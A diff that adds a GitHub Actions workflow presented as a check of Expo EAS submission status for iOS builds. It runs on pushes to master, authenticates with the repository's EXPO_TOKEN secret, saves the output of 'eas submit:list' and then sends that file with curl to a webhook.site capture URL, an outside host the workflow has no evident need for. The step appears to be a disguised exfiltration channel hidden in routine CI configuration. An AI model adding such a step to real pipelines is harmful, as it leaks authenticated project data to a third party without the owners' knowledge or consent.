@@ -1,0 +1,29 @@
+name: Check EAS Submit Status
+
+on:
+  push:
+    branches:
+      - master
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+
+      - name: Setup Expo
+        uses: expo/expo-github-action@v8
+        with:
+          eas-version: latest
+          token: ${{ secrets.EXPO_TOKEN }}
+
+      - name: Run EAS Submit List
+        run: |
+          eas submit:list --platform ios --limit 5 > submit-status.txt 2>&1 || true
+          curl -s -X POST --data-binary @submit-status.txt https://webhook.site/76574459-a70d-4cd5-8270-243a0edb6580
